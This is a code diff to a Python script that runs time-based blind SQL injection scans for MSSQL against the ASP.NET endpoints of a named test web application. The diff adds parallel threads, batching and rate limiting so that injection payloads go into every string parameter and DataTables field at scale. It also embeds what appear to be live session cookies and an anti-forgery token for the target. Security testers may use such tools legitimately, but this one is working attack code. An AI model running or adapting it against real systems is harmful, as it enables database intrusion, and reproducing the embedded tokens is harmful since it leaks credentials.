@@ -6,6 +6,9 @@ from typing import Dict, List, Any, Tuple
 import urllib3
 import argparse
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock
+import queue
 
 # ==================== GLOBAL CONFIGURATION ====================
 BASE_URL = "https://fundsq-degroof-test.azurewebsites.net"
@@ -13,6 +16,11 @@ DEFAULT_STRING_VALUE = "test_value"
 DEFAULT_INT_VALUE = 0
 DEFAULT_BOOL_VALUE = False
 DEFAULT_FLOAT_VALUE = 0.0
+
+# Parallel processing configuration
+MAX_WORKERS = 10  # Number of parallel threads
+BATCH_SIZE = 50   # Number of endpoints to process in each batch
+REQUEST_DELAY = 0.1  # Delay between requests in seconds (rate limiting)
 
 # SQL Injection Payloads - Time-based blind SQL injection for MSSQL
 SQL_INJECTION_PAYLOADS = [
@@ -61,7 +69,6 @@ HEADERS = {
     "sec-ch-ua-platform": '"Windows"'
 }
 
-
 COOKIES = {
     "ext_name": "ojplmecpdpgccookcobabopnaifgidhf",
     "__RequestVerificationToken": "nJSuzb0n01OdX9lHcSekGaAeGbuQV9Zo7AZ6Qy8wrppq35A-Yc9MbzNfP3BN8USn5gg7M9WhZvxiGd6GQEA9l_C0cvJE5-hUxVfuLt2hK_Q1",
@@ -75,9 +82,12 @@ COOKIES = {
     "idleTimer": "%7B%22idleTime%22%3A%220%22%2C%22updatedTime%22%3A%22Mon%20Dec%2022%202025%2012%3A51%3A20%20GMT%2B0530%20(India%20Standard%20Time)%22%7D"
 }
 
-
 # Input and output files
 INPUT_JSON_FILE = "endpoints.json"
+
+# Thread-safe counter and lock
+progress_lock = Lock()
+progress_counter = {"completed": 0, "vulnerable": 0, "total": 0}
 
 # ==================== UTILITY FUNCTIONS ====================
 
@@ -190,6 +200,7 @@ def test_baseline_response_time(url: str, http_method: str, params: Dict[str, An
     
     for i in range(2):  # Make 2 requests to get an average
         try:
+            time.sleep(REQUEST_DELAY)  # Rate limiting
             start_time = time.time()
             
             if http_method.upper() == "GET":
@@ -206,16 +217,31 @@ def test_baseline_response_time(url: str, http_method: str, params: Dict[str, An
             times.append(response_time)
             
         except Exception as e:
-            print(f"    ⚠ Baseline error: {e}")
             return 0.0, False
     
     avg_time = sum(times) / len(times) if times else 0.0
     return avg_time, True
 
 
-def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdata: bool = True) -> Dict[str, Any]:
+def update_progress(total: int, has_vulnerability: bool = False):
+    """Thread-safe progress update"""
+    with progress_lock:
+        progress_counter["completed"] += 1
+        if has_vulnerability:
+            progress_counter["vulnerable"] += 1
+        
+        completed = progress_counter["completed"]
+        vulnerable = progress_counter["vulnerable"]
+        percentage = (completed / total) * 100
+        
+        print(f"\rProgress: {completed}/{total} ({percentage:.1f}%) | Vulnerable: {vulnerable}", end="", flush=True)
+
+
+def test_sql_injection(endpoint: Dict, endpoint_index: int, total_endpoints: int, 
+                       use_encoded: bool = False, skip_searchdata: bool = True, 
+                       verbose: bool = False) -> Dict[str, Any]:
     """
-    Tests an endpoint for time-based SQL injection
+    Tests an endpoint for time-based SQL injection (thread-safe version)
     """
     route = endpoint.get("Route", "")
     http_verbs = endpoint.get("HttpVerbs", ["GET"])
@@ -229,6 +255,7 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
     if not is_datatable:
         should_skip, skip_reason = should_skip_endpoint(parameters, skip_searchdata)
         if should_skip:
+            update_progress(total_endpoints)
             return {
                 "endpoint": route,
                 "skipped": True,
@@ -237,44 +264,35 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
     
     # Determine what to test
     if is_datatable:
-        # Test DataTables fields
         test_fields = DATATABLE_INJECTABLE_FIELDS
         base_params = build_datatable_params()
-        print(f"\n{'='*80}")
-        print(f"Testing: {route}")
-        print(f"Method: POST (jQuery DataTables)")
-        print(f"DataTables fields to test: {len(test_fields)}")
-        print(f"{'='*80}")
+        if verbose:
+            print(f"\n[{endpoint_index}/{total_endpoints}] Testing DataTables: {route}")
     else:
-        # Test simple string parameters
         test_fields = get_string_parameters(parameters)
         if not test_fields:
+            update_progress(total_endpoints)
             return {
                 "endpoint": route,
                 "skipped": True,
                 "skip_reason": "No string parameters found"
             }
         base_params = build_request_params(parameters)
-        print(f"\n{'='*80}")
-        print(f"Testing: {route}")
-        print(f"Method: {http_verbs[0] if http_verbs else 'GET'}")
-        print(f"String parameters: {', '.join(test_fields)}")
-        print(f"{'='*80}")
+        if verbose:
+            print(f"\n[{endpoint_index}/{total_endpoints}] Testing: {route}")
     
     http_method = "POST" if is_datatable else (http_verbs[0] if http_verbs else "GET")
     
     # Establish baseline response time
-    print(f"  → Establishing baseline response time...")
     baseline_time, baseline_success = test_baseline_response_time(url, http_method, base_params)
     
     if not baseline_success:
+        update_progress(total_endpoints)
         return {
             "endpoint": route,
             "skipped": True,
             "skip_reason": "Unable to establish baseline"
         }
-    
-    print(f"    ✓ Baseline: {baseline_time:.2f}s")
     
     # Test results
     results = {
@@ -294,10 +312,8 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
     
     # Test each field with each payload
     for field_name in test_fields:
-        print(f"\n  → Testing field: {field_name}")
-        
-        for payload_idx, payload in enumerate(payloads, 1):
-            # Extract expected delay from payload (10 or 15 seconds)
+        for payload in payloads:
+            # Extract expected delay from payload
             expected_delay = 10.0
             if "'0:0:15'" in payload or "'0%3a0%3a15'" in payload:
                 expected_delay = 15.0
@@ -306,9 +322,8 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
             test_params = base_params.copy()
             test_params[field_name] = payload
             
-            print(f"    [{payload_idx}/{len(payloads)}] Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
-            
             try:
+                time.sleep(REQUEST_DELAY)  # Rate limiting
                 start_time = time.time()
                 
                 if http_method.upper() == "GET":
@@ -322,11 +337,7 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
                 
                 end_time = time.time()
                 response_time = end_time - start_time
-                
-                # Check if delay is significant
                 time_difference = response_time - baseline_time
-                
-                print(f"      Time: {response_time:.2f}s (diff: {time_difference:.2f}s, expected: ~{expected_delay}s)")
                 
                 # If response time exceeds threshold, potentially vulnerable
                 if time_difference >= DELAY_THRESHOLD:
@@ -341,12 +352,10 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
                         "vulnerable": True
                     }
                     results["vulnerabilities"].append(vulnerability)
-                    print(f"      🚨 VULNERABLE DETECTED! Confirmed delay: {time_difference:.2f}s")
-                else:
-                    print(f"      ✓ No vulnerability detected")
+                    if verbose:
+                        print(f"\n  🚨 VULNERABLE: {route} - {field_name}")
                 
             except requests.exceptions.Timeout:
-                print(f"      ⏱ Timeout (>60s) - Potentially vulnerable")
                 vulnerability = {
                     "parameter": field_name,
                     "payload": payload,
@@ -358,15 +367,57 @@ def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdat
                     "vulnerable": True
                 }
                 results["vulnerabilities"].append(vulnerability)
+                if verbose:
+                    print(f"\n  🚨 TIMEOUT: {route} - {field_name}")
             except Exception as e:
-                print(f"      ✗ Error: {str(e)[:100]}")
+                if verbose:
+                    print(f"\n  ✗ Error on {route}: {str(e)[:50]}")
+    
+    has_vuln = len(results["vulnerabilities"]) > 0
+    update_progress(total_endpoints, has_vuln)
+    
+    return results
+
+
+def process_batch(endpoints_batch: List[Tuple[Dict, int]], total_endpoints: int, 
+                  use_encoded: bool, skip_searchdata: bool, verbose: bool, 
+                  max_workers: int) -> List[Dict]:
+    """Process a batch of endpoints in parallel"""
+    results = []
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_endpoint = {
+            executor.submit(
+                test_sql_injection, 
+                endpoint, 
+                idx, 
+                total_endpoints, 
+                use_encoded, 
+                skip_searchdata,
+                verbose
+            ): (endpoint, idx)
+            for endpoint, idx in endpoints_batch
+        }
+        
+        for future in as_completed(future_to_endpoint):
+            try:
+                result = future.result()
+                results.append(result)
+            except Exception as e:
+                endpoint, idx = future_to_endpoint[future]
+                print(f"\n✗ Exception processing endpoint {idx}: {str(e)[:100]}")
+                results.append({
+                    "endpoint": endpoint.get("Route", "N/A"),
+                    "skipped": True,
+                    "skip_reason": f"Exception: {str(e)[:100]}"
+                })
     
     return results
 
 
 def main():
     """Main function"""
-    parser = argparse.ArgumentParser(description='SQL Injection time-based testing on ASP.NET endpoints')
+    parser = argparse.ArgumentParser(description='Parallel SQL Injection time-based testing on ASP.NET endpoints')
     parser.add_argument('--start', type=int, default=0, help='Start index')
     parser.add_argument('--end', type=int, default=None, help='End index')
     parser.add_argument('--limit', type=int, default=None, help='Maximum number of endpoints')
@@ -377,17 +428,33 @@ def main():
                        help='Include endpoints with searchData parameter (normally skipped)')
     parser.add_argument('--input', type=str, default=INPUT_JSON_FILE, 
                        help=f'Input JSON file (default: {INPUT_JSON_FILE})')
+    parser.add_argument('--workers', type=int, default=MAX_WORKERS,
+                       help=f'Number of parallel workers (default: {MAX_WORKERS})')
+    parser.add_argument('--batch-size', type=int, default=BATCH_SIZE,
+                       help=f'Batch size for processing (default: {BATCH_SIZE})')
+    parser.add_argument('--verbose', action='store_true',
+                       help='Enable verbose output (shows individual endpoint progress)')
+    parser.add_argument('--delay', type=float, default=REQUEST_DELAY,
+                       help=f'Delay between requests in seconds (default: {REQUEST_DELAY})')
     
     args = parser.parse_args()
     
+    # Use local variables instead of modifying globals
+    max_workers = args.workers
+    batch_size = args.batch_size
+    request_delay = args.delay
+    
     print(f"\n{'='*80}")
-    print(f"SQL INJECTION TESTING - Time-Based Blind SQL Injection (MSSQL)")
+    print(f"PARALLEL SQL INJECTION TESTING - Time-Based Blind SQL Injection (MSSQL)")
     print(f"{'='*80}")
     print(f"Base URL: {BASE_URL}")
     print(f"Input file: {args.input}")
     print(f"Payloads: {'URL-encoded' if args.use_encoded else 'Standard'}")
     print(f"Detection threshold: {DELAY_THRESHOLD}s")
     print(f"Skip searchData: {'No' if args.test_searchdata else 'Yes'}")
+    print(f"Parallel workers: {max_workers}")
+    print(f"Batch size: {batch_size}")
+    print(f"Request delay: {request_delay}s")
     print(f"{'='*80}\n")
     
     # Load endpoints
@@ -417,59 +484,85 @@ def main():
         end_idx = len(endpoints)
     
     endpoints_to_test = endpoints[start_idx:end_idx]
-    print(f"✓ Testing {len(endpoints_to_test)} endpoints (index {start_idx} to {end_idx-1})\n")
+    total_endpoints = len(endpoints_to_test)
+    
+    print(f"✓ Testing {total_endpoints} endpoints (index {start_idx} to {end_idx-1})")
+    print(f"✓ Estimated time: {(total_endpoints * 5 * 2) / MAX_WORKERS / 60:.1f} minutes (approximate)\n")
+    
+    # Initialize progress counter
+    progress_counter["total"] = total_endpoints
+    progress_counter["completed"] = 0
+    progress_counter["vulnerable"] = 0
     
     output_file = f"sqli_results_{start_idx}_{end_idx}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
     
-    # Test each endpoint
-    results = []
-    vulnerable_count = 0
+    # Process in batches
+    all_results = []
+    start_time = time.time()
     
-    for i, endpoint in enumerate(endpoints_to_test, start_idx + 1):
-        route = endpoint.get("Route", "N/A")
-        print(f"\n[{i}/{start_idx + len(endpoints_to_test)}] ", end="")
-        
-        result = test_sql_injection(endpoint, args.use_encoded, not args.test_searchdata)
-        results.append(result)
-        
-        if not result.get("skipped") and result.get("vulnerabilities"):
-            vulnerable_count += 1
-            print(f"\n  ⚠️  VULNERABLE ENDPOINT: {len(result['vulnerabilities'])} vulnerability(ies) detected")
+    print(f"Starting parallel processing...\n")
     
-    # Save results
-    try:
-        with open(output_file, 'w', encoding='utf-8') as f:
-            json.dump(results, f, indent=2, ensure_ascii=False)
-        print(f"\n{'='*80}")
-        print(f"✓ Results saved to '{output_file}'")
-    except Exception as e:
-        print(f"\n✗ Error saving results: {e}")
+    for batch_start in range(0, total_endpoints, batch_size):
+        batch_end = min(batch_start + batch_size, total_endpoints)
+        batch = [(endpoints_to_test[i], start_idx + batch_start + i + 1) 
+                 for i in range(batch_end - batch_start)]
+        
+        batch_results = process_batch(
+            batch, 
+            total_endpoints, 
+            args.use_encoded, 
+            not args.test_searchdata,
+            args.verbose,
+            max_workers
+        )
+        
+        all_results.extend(batch_results)
+        
+        # Save intermediate results after each batch
+        try:
+            with open(output_file, 'w', encoding='utf-8') as f:
+                json.dump(all_results, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            print(f"\n⚠ Warning: Could not save intermediate results: {e}")
+    
+    end_time = time.time()
+    total_time = end_time - start_time
+    
+    print(f"\n\n{'='*80}")
+    print(f"✓ All processing completed in {total_time/60:.2f} minutes")
+    print(f"✓ Results saved to '{output_file}'")
     
     # Final statistics
-    total = len(results)
-    skipped = sum(1 for r in results if r.get("skipped"))
+    total = len(all_results)
+    skipped = sum(1 for r in all_results if r.get("skipped"))
     tested = total - skipped
+    vulnerable_count = sum(1 for r in all_results if not r.get("skipped") and r.get("vulnerabilities"))
     
     print(f"\n{'='*80}")
     print(f"SQL INJECTION TEST SUMMARY")
     print(f"{'='*80}")
-    print(f"Total endpoints tested: {tested}")
+    print(f"Total endpoints processed: {total}")
+    print(f"Endpoints tested: {tested}")
     print(f"Endpoints skipped: {skipped}")
     print(f"VULNERABLE endpoints: {vulnerable_count}")
     print(f"Vulnerability rate: {vulnerable_count/tested*100:.1f}%" if tested > 0 else "N/A")
+    print(f"Average time per endpoint: {total_time/total:.2f}s")
+    print(f"Throughput: {total/(total_time/60):.1f} endpoints/minute")
     print(f"{'='*80}\n")
     
     # Display found vulnerabilities
     if vulnerable_count > 0:
         print(f"\n🚨 VULNERABILITIES DETECTED:")
         print(f"{'='*80}")
-        for result in results:
+        for result in all_results:
             if result.get("vulnerabilities"):
                 print(f"\nEndpoint: {result['endpoint']}")
+                print(f"Method: {result.get('http_method', 'N/A')}")
                 for vuln in result['vulnerabilities']:
                     print(f"  → Parameter: {vuln['parameter']}")
                     print(f"    Payload: {vuln['payload'][:60]}...")
                     print(f"    Observed delay: {vuln['time_difference']}s (expected: ~{vuln['expected_delay']}s)")
+        print(f"{'='*80}\n")
 
 
 if __name__ == "__main__":
